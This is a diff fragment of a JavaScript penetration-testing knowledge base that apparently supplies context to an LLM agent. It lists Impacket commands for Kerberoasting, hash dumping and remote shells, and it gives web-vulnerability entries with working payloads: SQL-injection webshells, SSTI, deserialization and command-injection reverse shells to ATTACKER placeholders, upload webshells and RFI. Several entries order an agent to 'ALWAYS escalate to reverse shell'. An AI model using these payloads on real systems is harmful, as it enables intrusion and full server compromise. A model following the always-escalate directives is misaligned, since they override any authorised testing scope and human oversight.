+        useCases: ["Exploit execution", "Payload generation", "Post-exploitation", "Pivoting", "Credential dumping"],
+        outputParsing: "Use -o flag for file output. Meterpreter sessions provide structured output via commands like hashdump, sysinfo.",
+        cheatSheetUrl: "https://docs.metasploit.com/"
+      },
+      {
+        name: "burp_suite",
+        displayName: "Burp Suite",
+        category: "Web Application Testing",
+        description: "Integrated web application security testing platform with proxy, scanner, and manual testing tools.",
+        installCommand: "Download from portswigger.net",
+        quickReference: [
+          "Configure browser proxy: 127.0.0.1:8080",
+          "Intercept \u2192 Forward/Drop requests",
+          "Send to Repeater for manual testing",
+          "Send to Intruder for automated fuzzing",
+          "Scanner for automated vulnerability detection",
+          "Decoder for encoding/decoding payloads"
+        ],
+        commonFlags: [
+          { flag: "Proxy", description: "Intercept and modify HTTP traffic" },
+          { flag: "Repeater", description: "Manual request modification and replay" },
+          { flag: "Intruder", description: "Automated payload injection" },
+          { flag: "Scanner", description: "Automated vulnerability scanning" },
+          { flag: "Decoder", description: "Encode/decode payloads" },
+          { flag: "Comparer", description: "Diff two responses" }
+        ],
+        useCases: ["Web app testing", "API testing", "Parameter fuzzing", "Authentication testing", "Session analysis"],
+        outputParsing: "Export findings as XML/HTML reports. Use Burp API for automation.",
+        cheatSheetUrl: "https://portswigger.net/burp/documentation"
+      },
+      {
+        name: "bloodhound",
+        displayName: "BloodHound",
+        category: "Active Directory",
+        description: "Graph-based Active Directory reconnaissance tool that reveals attack paths to high-value targets.",
+        installCommand: "pip3 install bloodhound",
+        quickReference: [
+          "bloodhound-python -d <domain> -u <user> -p <pass> -c all -ns <dc_ip>",
+          "# Import JSON files into BloodHound GUI",
+          "# Pre-built queries: Shortest Path to Domain Admin",
+          "# Mark owned users/computers for path analysis",
+          "# Custom Cypher queries for specific attack paths"
+        ],
+        commonFlags: [
+          { flag: "-c all", description: "Collect all data (users, groups, computers, sessions, ACLs)" },
+          { flag: "-d", description: "Target domain" },
+          { flag: "-ns", description: "Nameserver (domain controller IP)" },
+          { flag: "--zip", description: "Compress output for easy transfer" }
+        ],
+        useCases: ["AD enumeration", "Attack path identification", "Privilege escalation planning", "ACL abuse discovery", "Trust mapping"],
+        outputParsing: "JSON output imported into BloodHound GUI. Use Cypher queries for custom analysis.",
+        cheatSheetUrl: "https://bloodhound.readthedocs.io/"
+      },
+      {
+        name: "impacket",
+        displayName: "Impacket",
+        category: "Active Directory / Network",
+        description: "Python library and tools for working with network protocols, particularly SMB, Kerberos, and LDAP for AD attacks.",
+        installCommand: "pip3 install impacket",
+        quickReference: [
+          "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc> -request  # Kerberoast",
+          "impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc>    # AS-REP roast",
+          "impacket-secretsdump <domain>/<admin>:<pass>@<dc>                 # Dump hashes",
+          "impacket-psexec <domain>/<admin>:<pass>@<target>                  # Remote shell",
+          "impacket-wmiexec <domain>/<admin>:<pass>@<target>                 # WMI shell",
+          "impacket-smbclient <domain>/<user>:<pass>@<target>                # SMB access"
+        ],
+        commonFlags: [
+          { flag: "-dc-ip", description: "Domain controller IP address" },
+          { flag: "-request", description: "Request TGS tickets for cracking" },
+          { flag: "-hashes", description: "Use NTLM hash instead of password" },
+          { flag: "-k", description: "Use Kerberos authentication" }
+        ],
+        useCases: ["Kerberoasting", "AS-REP roasting", "Credential dumping", "Remote execution", "SMB enumeration", "NTLM relay"],
+        outputParsing: "Hash output in hashcat/john compatible format. Use -outputfile flag for file output.",
+        cheatSheetUrl: "https://github.com/fortra/impacket"
+      }
+    ];
+    WEB_VULN_KNOWLEDGE = [
+      {
+        id: "WEB-001",
+        name: "SQL Injection",
+        owaspCategory: "A03:2021 - Injection",
+        cweId: "CWE-89",
+        description: "SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.",
+        testingMethodology: [
+          "Identify all input vectors (URL params, POST body, headers, cookies)",
+          "Test each with single quote, double quote, and SQL keywords",
+          "Determine injection type: error-based, UNION, blind boolean, blind time-based",
+          "Identify DBMS from error messages or behavior",
+          "Extract schema information (databases, tables, columns)",
+          "Dump sensitive data (credentials, PII)",
+          "ESCALATE TO SHELL: MSSQL\u2192xp_cmdshell, MySQL\u2192INTO OUTFILE webshell, PostgreSQL\u2192COPY TO PROGRAM, SQLite\u2192attach+write",
+          "If stacked queries supported, enable xp_cmdshell and execute reverse shell payload",
+          "If file write available, write PHP/JSP webshell then use it to spawn reverse shell"
+        ],
+        commonPayloads: [
+          "' OR '1'='1",
+          "' UNION SELECT NULL--",
+          "' AND SLEEP(5)--",
+          "1' ORDER BY 1--+",
+          "' UNION SELECT username,password FROM users--",
+          "'; EXEC xp_cmdshell('whoami')--",
+          "' UNION SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/s.php'--",
+          "'; COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'--"
+        ],
+        impactDescription: "Data breach, authentication bypass, data manipulation, remote code execution via OS command execution (xp_cmdshell, INTO OUTFILE, COPY TO PROGRAM). ALWAYS escalate to reverse shell. Severity: Critical.",
+        remediationGuidance: "Use parameterized queries (prepared statements). Implement input validation with allowlists. Apply least privilege to database accounts. Enable WAF rules for SQL injection patterns.",
+        references: ["https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"]
+      },
+      {
+        id: "WEB-002",
+        name: "Cross-Site Scripting (XSS)",
+        owaspCategory: "A03:2021 - Injection",
+        cweId: "CWE-79",
+        description: "XSS flaws occur when an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript.",
+        testingMethodology: [
+          "Map all reflection points in the application",
+          "Test reflected XSS in URL parameters and form fields",
+          "Test stored XSS in user-generated content areas",
+          "Test DOM-based XSS by reviewing client-side JavaScript",
+          "Identify output encoding context (HTML, attribute, JS, URL)",
+          "Craft context-appropriate payloads to bypass filters"
+        ],
+        commonPayloads: [
+          "<script>alert(1)</script>",
+          "<img src=x onerror=alert(1)>",
+          "javascript:alert(1)",
+          "'-alert(1)-'",
+          "{{7*7}}"
+        ],
+        impactDescription: "Session hijacking, credential theft, defacement, malware distribution, phishing. Severity: Medium to High depending on context.",
+        remediationGuidance: "Implement context-aware output encoding. Use Content Security Policy (CSP) headers. Sanitize HTML input with a proven library (DOMPurify). Enable HttpOnly and Secure flags on cookies.",
+        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"]
+      },
+      {
+        id: "WEB-003",
+        name: "Insecure Deserialization",
+        owaspCategory: "A08:2021 - Software and Data Integrity Failures",
+        cweId: "CWE-502",
+        description: "Insecure deserialization occurs when untrusted data is used to abuse the logic of an application, inflict a denial of service (DoS) attack, or execute arbitrary code upon being deserialized.",
+        testingMethodology: [
+          "Identify serialized data in requests (base64, binary, JSON)",
+          "Determine serialization format (Java, PHP, Python pickle, .NET)",
+          "Test for type confusion and property injection",
+          "Generate malicious serialized objects with ysoserial/phpggc",
+          "Test for RCE through gadget chains"
+        ],
+        commonPayloads: [
+          "ysoserial CommonsCollections1 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'",
+          `phpggc Laravel/RCE1 system 'bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"'`,
+          "python3 pickle payload: __reduce__ \u2192 os.system('reverse_shell')",
+          "ysoserial.net TypeConfuseDelegate 'powershell reverse shell'"
+        ],
+        impactDescription: "Remote code execution \u2192 reverse shell, privilege escalation, data tampering. ALWAYS use gadget chains that execute reverse shell payloads. Severity: Critical.",
+        remediationGuidance: "Avoid deserializing untrusted data. Use integrity checks (HMAC) on serialized objects. Implement type allowlists. Monitor deserialization activity.",
+        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"]
+      },
+      {
+        id: "WEB-004",
+        name: "Server-Side Template Injection (SSTI)",
+        owaspCategory: "A03:2021 - Injection",
+        cweId: "CWE-1336",
+        description: "SSTI occurs when user input is embedded in a server-side template in an unsafe manner, allowing attackers to inject template directives that execute arbitrary code on the server.",
+        testingMethodology: [
+          "Identify template engine from error messages or technology stack",
+          "Test with polyglot payloads: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>",
+          "Determine template engine from successful evaluation",
+          "Escalate from expression evaluation to code execution",
+          "Use engine-specific RCE payloads"
+        ],
+        commonPayloads: [
+          "{{7*7}}",
+          "${7*7}",
+          "#{7*7}",
+          "<%= 7*7 %>",
+          "{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER/PORT 0>&1').read()}}",
+          "{{request.application.__globals__.__builtins__.__import__('os').popen('reverse_shell').read()}}",
+          "Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('reverse_shell')}}",
+          "Freemarker: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('reverse_shell')}"
+        ],
+        impactDescription: "Remote code execution \u2192 reverse shell, full server compromise. ALWAYS escalate from expression eval to OS command execution to reverse shell. Severity: Critical.",
+        remediationGuidance: "Never pass user input directly into templates. Use logic-less template engines. Implement sandboxing for template execution. Apply input validation.",
+        references: ["https://portswigger.net/web-security/server-side-template-injection"]
+      },
+      {
+        id: "WEB-005",
+        name: "OS Command Injection",
+        owaspCategory: "A03:2021 - Injection",
+        cweId: "CWE-78",
+        description: "Command injection occurs when an application passes unsafe user-supplied data to a system shell. The attacker can execute arbitrary OS commands on the server.",
+        testingMethodology: [
+          "Identify inputs that interact with OS commands (ping, nslookup, file operations)",
+          "Test with command separators: ;, |, ||, &&, newline, $(cmd), `cmd`",
+          "Test blind injection with time delays: ; sleep 5",
+          "Test out-of-band with DNS/HTTP callbacks",
+          "ESCALATE TO REVERSE SHELL immediately once command execution confirmed",
+          "Try multiple shell payloads: bash, python, perl, nc, php"
+        ],
+        commonPayloads: [
+          "; whoami",
+          "| id",
+          "|| id",
+          "&& id",
+          "`id`",
+          "$(id)",
+          "; bash -i >& /dev/tcp/ATTACKER_HOST/ATTACKER_PORT 0>&1",
+          `| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((ATTACKER,PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
+          "| nc -e /bin/sh ATTACKER_HOST ATTACKER_PORT",
+          "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f"
+        ],
+        impactDescription: "Direct OS command execution \u2192 reverse shell \u2192 full server compromise. This is the most direct path to a shell. Severity: Critical.",
+        remediationGuidance: "Never pass user input to OS commands. Use language-specific APIs instead of shell commands. If unavoidable, use strict allowlists and escape all special characters.",
+        references: ["https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"]
+      },
+      {
+        id: "WEB-006",
+        name: "Unrestricted File Upload",
+        owaspCategory: "A04:2021 - Insecure Design",
+        cweId: "CWE-434",
+        description: "The application allows uploading files without proper validation of file type, content, or storage location, enabling attackers to upload executable code (webshells).",
+        testingMethodology: [
+          "Identify file upload endpoints",
+          "Test extension bypass: .php5, .phtml, .phar, .php.jpg, null byte",
+          "Test content-type bypass: set image/jpeg with PHP content",
+          "Test magic byte bypass: prepend GIF89a to PHP shell",
+          "Upload PHP/JSP/ASPX webshell with system() call",
+          "Access uploaded webshell and execute reverse shell payload"
+        ],
+        commonPayloads: [
+          "<?php system($_GET['cmd']); ?>",
+          "GIF89a<?php system($_GET['cmd']); ?>",
+          "Upload shell.php then access /uploads/shell.php?cmd=reverse_shell_payload"
+        ],
+        impactDescription: "Webshell upload \u2192 OS command execution \u2192 reverse shell \u2192 full server compromise. Severity: Critical.",
+        remediationGuidance: "Validate file types with allowlists. Check file content (magic bytes). Store uploads outside webroot. Rename uploaded files. Disable script execution in upload directories.",
+        references: ["https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"]
+      },
+      {
+        id: "WEB-007",
+        name: "Local/Remote File Inclusion (LFI/RFI)",
+        owaspCategory: "A03:2021 - Injection",
+        cweId: "CWE-98",
+        description: "File inclusion vulnerabilities allow an attacker to include files on a server through the web browser, potentially leading to code execution, data exposure, or denial of service.",
+        testingMethodology: [
+          "Identify parameters that load files (page=, include=, file=, template=)",
+          "Test LFI: ../../etc/passwd, php://filter for source disclosure",
+          "Test RFI: include attacker-hosted PHP shell",
+          "LFI to shell via log poisoning: inject PHP in User-Agent then include access log",
+          "LFI to shell via php://input: POST PHP reverse shell code",
+          "LFI to shell via /proc/self/environ: inject PHP in headers"
+        ],
+        commonPayloads: [
+          "../../../../../../etc/passwd",
+          "php://filter/convert.base64-encode/resource=index.php",
+          "php://input (POST: <?php system('reverse_shell'); ?>)",
+          "http://ATTACKER_HOST/shell.php (RFI)",
+          "../../var/log/apache2/access.log (after User-Agent poisoning)"
+        ],
+        impactDescription: "File disclosure, source code leak, and when escalated: remote code execution \u2192 reverse shell. Severity: High to Critical.",
+        remediationGuidance: "Never use user input in file inclusion paths. Use allowlists for allowed files. Disable allow_url_include in PHP. Implement proper access controls.",
+        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"]
+      },
+      {
+        id: "WEB-008",
+        name: "Default/Weak Credentials",
+        owaspCategory: "A07:2021 - Identification and Authentication Failures",
+        cweId: "CWE-798",
+        description: "Services running with default, weak, or well-known credentials that allow unauthorized access, often leading directly to shell access or administrative control.",
+        testingMethodology: [
+          "Identify all authentication endpoints (SSH, FTP, databases, web admin panels)",
+          "Test common default credential pairs for detected services",
+          "Brute force with targeted wordlists based on service type",
+          "SSH/Telnet with default creds leads to direct shell access",
+          "Database default creds leads to escalation via OS command execution",
+          "Web admin panels (Tomcat Manager, Jenkins, phpMyAdmin) leads to deploy webshell or execute code"
+        ],
+        commonPayloads: [
+          "admin:admin, admin:password, root:root, root:toor",
+          "Tomcat: tomcat:tomcat then deploy WAR with JSP reverse shell",
+          "Jenkins: admin:admin then Script Console with Groovy reverse shell",
+          "MySQL: root:(empty) then SELECT INTO OUTFILE webshell",
+          "Redis: no auth then CONFIG SET dir/dbfilename to write webshell or SSH key",
+          "PostgreSQL: postgres:postgres then COPY TO PROGRAM reverse shell"
+        ],
+        impactDescription: "Direct authentication bypass \u2192 shell access (SSH/Telnet) or administrative access \u2192 code execution \u2192 reverse shell. Severity: Critical.",
+        remediationGuidance: "Change all default credentials. Enforce strong password policies. Implement account lockout. Use multi-factor authentication. Disable unnecessary services.",
+        references: ["https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"]
+      }
+    ];
+  }
+});
+
+export {
+  TECHNIQUE_LIBRARY,
+  TOOL_LIBRARY,
+  WEB_VULN_KNOWLEDGE,
+  getKnowledgeForRole,
+  buildKnowledgeContextForLLM,
+  searchTechniques,
+  searchTools,
+  init_pentest_knowledge_base
+};
